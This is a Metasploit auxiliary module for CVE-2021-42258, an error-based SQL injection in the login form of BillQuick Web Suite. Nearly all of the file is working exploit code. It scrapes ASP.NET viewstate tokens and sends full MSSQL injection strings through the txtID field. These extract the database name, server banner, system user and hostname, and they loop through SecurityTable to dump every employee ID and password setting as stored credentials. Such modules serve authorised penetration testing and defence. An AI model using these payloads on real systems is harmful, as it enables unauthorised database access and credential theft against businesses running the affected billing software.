##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'BillQuick Web Suite txtID SQLi',
        'Description' => %q{
          This module exploits a SQL injection vulnerability in BillQUick Web Suite prior to version 22.0.9.1.
          The application is .net based, and the database is required to be MSSQL.  Luckily the website gives
          error based SQLi messages, so it is trivial to pull data from the database.  However the webapp
          uses an unknown password security algorithm.  This vulnerability does not seem to support stacked
          queries.
          This module pulls the database name, banner, user, hostname, and the SecurityTable (user table).
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # msf module
          'Caleb Stewart <caleb.stewart94[at]gmail.com>' # original PoC, analysis
        ],
        'References' => [
          ['URL', 'https://www.huntress.com/blog/threat-advisory-hackers-are-exploiting-a-vulnerability-in-popular-billing-software-to-deploy-ransomware'],
          ['URL', 'http://billquick.net/download/Support_Download/BQWS2021Upgrade/WebSuite2021LogFile_9_1.pdf'],
          ['CVE', '2021-42258']
        ],
        'DefaultOptions' => {
          'HttpClientTimeout' => 15 # The server tends to be super slow, so allow 15sec per request
        },
        'DisclosureDate' => '2021-10-22',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [ true, 'The URI of BillQuick Web Suite', '/ws2020/'])
      ], self.class
    )
  end

  def check
    begin
      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, 'default.aspx'),
        'method' => 'GET'
      }, datastore['HttpClientTimeout'])
      return Exploit::CheckCode::Unknown("#{peer} - Could not connect to web service - no response") if res.nil?
      return Exploit::CheckCode::Safe("#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}") if res.code != 200

      %r{Version: (?<version>\d{1,2}\.\d{1,2}\.\d{1,2})\.\d{1,2}</span>} =~ res.body

      if version && Rex::Version.new(version) <= Rex::Version.new('22.0.9.1')
        return Exploit::CheckCode::Appears("Version Detected: #{version}")
      end
    rescue ::Rex::ConnectionError
      return Exploit::CheckCode::Unknown("#{peer} - Could not connect to the web service")
    end
    Exploit::CheckCode::Safe("Unexploitable Version: #{version}")
  end

  def rand_chars(len = 6)
    Rex::Text.rand_text_alpha(len)
  end

  def char_list(string)
    ('char(' + string.split('').map(&:ord).join(')+char(') + ')').to_s
  end

  def error_info(body)
    /BQEShowModalAlert\('Information','(?<error>[^']+)/ =~ body
    error
  end

  def inject(content, state, generator, validation)
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'default.aspx'),
      'method' => 'POST',
      'vars_post' => {
        '__VIEWSTATE' => state,
        '__VIEWSTATEGENERATOR' => generator,
        '__EVENTVALIDATION' => validation,
        '__EVENTTARGET' => 'cmdOK',
        '__EVENTARGUMENT' => '',
        'txtID' => content,
        'txtPW' => '',
        'hdnClientDPI' => '96'
      }
    }, datastore['HttpClientTimeout'])

    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}") if res.code != 200
    res.body
  end

  def run
    vprint_status('Getting Variables')
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'default.aspx'),
      'method' => 'GET'
    }, datastore['HttpClientTimeout'])

    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}") if res.code != 200

    /id="__VIEWSTATE" value="(?<viewstate>[^"]+)/ =~ res.body
    /id="__VIEWSTATEGENERATOR" value="(?<viewstategenerator>[^"]+)/ =~ res.body
    /id="__EVENTVALIDATION" value="(?<eventvalidation>[^"]+)/ =~ res.body
    unless viewstate && viewstategenerator && eventvalidation
      fail_with(Failure::UnexpectedReply, 'Unable to find viewstate, viewstategenerator, and eventvalidation values.')
    end
    vprint_status("VIEWSTATE: #{viewstate}")
    vprint_status("VIEWSTATEGENERATOR: #{viewstategenerator}")
    vprint_status("EVENTVALIDATION: #{eventvalidation}")

    header = rand_chars
    footer = rand_chars
    header_char = char_list(header)
    footer_char = char_list(footer)
    int = Rex::Text.rand_text_numeric(4)

    service = {
      address: rhost,
      port: datastore['RPORT'],
      protocol: 'tcp',
      service_name: 'BillQuick Web Suite',
      workspace_id: myworkspace_id
    }
    report_service(service)

    # all inject strings taken from sqlmap runs, using error page method
    res = inject("'+(SELECT #{char_list(rand_chars)} WHERE #{int}=#{int} AND CHARINDEX(CHAR(49)+CHAR(53)+CHAR(46)+CHAR(48)+CHAR(46),@@VERSION)>0)+'", viewstate, viewstategenerator, eventvalidation)
    /, table \\u0027(?<table>.+?)\\u0027/ =~ error_info(res)
    print_good("Current Database: #{table.split('.').first}")
    report_note(host: rhost, port: rport, type: 'database', data: table.split('.').first)

    res = inject("'+(SELECT #{char_list(rand_chars)} WHERE #{int}=#{int} AND 1325 IN (SELECT (#{header_char}+(SELECT SUBSTRING((ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32))),1,1024))+#{footer_char})))+'", viewstate, viewstategenerator, eventvalidation)
    /\\u0027(?<banner>.+?)\\u0027/ =~ error_info(res)
    banner.slice!(header)
    banner.slice!(footer)
    banner = banner.gsub('\n', "\n").gsub('\t', "\t")
    print_good("Banner: #{banner}")

    res = inject("'+(SELECT #{char_list(rand_chars)} WHERE #{int}=#{int} AND 8603 IN (SELECT (#{header_char}+(SELECT SUBSTRING((ISNULL(CAST(SYSTEM_USER AS NVARCHAR(4000)),CHAR(32))),1,1024))+#{footer_char})))+'", viewstate, viewstategenerator, eventvalidation)
    /\\u0027(?<user>.+?)\\u0027/ =~ error_info(res)
    user.slice!(header)
    user.slice!(footer)
    print_good("DB User: #{user}")
    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: user,
      private_type: :nonreplayable_hash,
      private_data: ''
    }.merge(service)
    create_credential(credential_data)

    res = inject("'+(SELECT #{char_list(rand_chars)} WHERE #{int}=#{int} AND 7555 IN (SELECT (#{header_char}+(SUBSTRING((ISNULL(CAST(@@SERVERNAME AS NVARCHAR(4000)),CHAR(32))),1,1024))+#{footer_char})))+'", viewstate, viewstategenerator, eventvalidation)
    /\\u0027(?<hostname>.+?)\\u0027/ =~ error_info(res)
    hostname.slice!(header)
    hostname.slice!(footer)
    print_good("Hostname: #{hostname}")

    report_host(host: rhost, name: hostname, info: banner.gsub('\n', "\n").gsub('\n', "\n"), os_name: OperatingSystems::WINDOWS)

    sec_table = "#{table.split('.')[0...-1].join('.')}.SecurityTable"

    # get user count from SecurityTable
    res = inject("'+(SELECT #{char_list(rand_chars)} WHERE #{int}=#{int} AND 8815 IN (SELECT (#{header_char}+(SELECT ISNULL(CAST(COUNT(*) AS NVARCHAR(4000)),CHAR(32)) FROM #{sec_table} WHERE ModuleID=0)+#{footer_char})))+'", viewstate, viewstategenerator, eventvalidation)
    /\\u0027(?<user_count>.+?)\\u0027/ =~ error_info(res)
    user_count.slice!(header)
    user_count.slice!(footer)
    print_good("User Count in #{sec_table}: #{user_count}")

    table = Rex::Text::Table.new(
      'Header' => sec_table,
      'Indent' => 1,
      'SortIndex' => -1,
      'Columns' =>
      [
        'EmployeeID',
        'Settings',
      ]
    )

    (1..user_count.to_i).each do |index|
      # username
      # select EmployeeID from test.dbo.SecurityTable where ModuleID=0
      res = inject("'+(SELECT #{char_list(rand_chars)} WHERE #{int}=#{int} AND 2292 IN (SELECT (#{header_char}+(SELECT TOP 1 SUBSTRING((ISNULL(CAST(EmployeeID AS NVARCHAR(4000)),CHAR(32))),1,1024) FROM #{sec_table} WHERE ModuleID=0 AND ISNULL(CAST(EmployeeID AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP #{index - 1} ISNULL(CAST(EmployeeID AS NVARCHAR(4000)),CHAR(32)) FROM #{sec_table} WHERE ModuleID=0 ORDER BY EmployeeID) ORDER BY EmployeeID)+#{footer_char})))+'", viewstate, viewstategenerator, eventvalidation)
      /\\u0027(?<username>.+?)\\u0027/ =~ error_info(res)
      username.slice!(header)
      username.slice!(footer)
      print_good("Username: #{username}")

      # settings
      # select Settings from test.dbo.SecurityTable where ModuleID=0
      res = inject("'+(SELECT #{char_list(rand_chars)} WHERE #{int}=#{int} AND 7411 IN (SELECT (#{header_char}+(SELECT TOP 1 SUBSTRING((ISNULL(CAST(Settings AS NVARCHAR(4000)),CHAR(32))),1,1024) FROM #{sec_table} WHERE ModuleID=0 AND ISNULL(CAST(EmployeeID AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP #{index - 1} ISNULL(CAST(EmployeeID AS NVARCHAR(4000)),CHAR(32)) FROM #{sec_table} WHERE ModuleID=0 ORDER BY EmployeeID) ORDER BY EmployeeID)+#{footer_char})))+'", viewstate, viewstategenerator, eventvalidation)
      /\\u0027(?<settings>.+?)\\u0027/ =~ error_info(res)
      settings.slice!(header)
      settings.slice!(footer)
      print_good("User #{username} settings: #{settings}")
      table << [username, settings]
      credential_data = {
        origin_type: :service,
        module_fullname: fullname,
        username: username,
        private_type: :nonreplayable_hash, # prob encrypted not hash, so lies.
        private_data: settings.split('|').first
      }.merge(service)
      create_credential(credential_data)
    end
    print_good(table.to_s)
    print_status('Default password is the username.')
  end
end
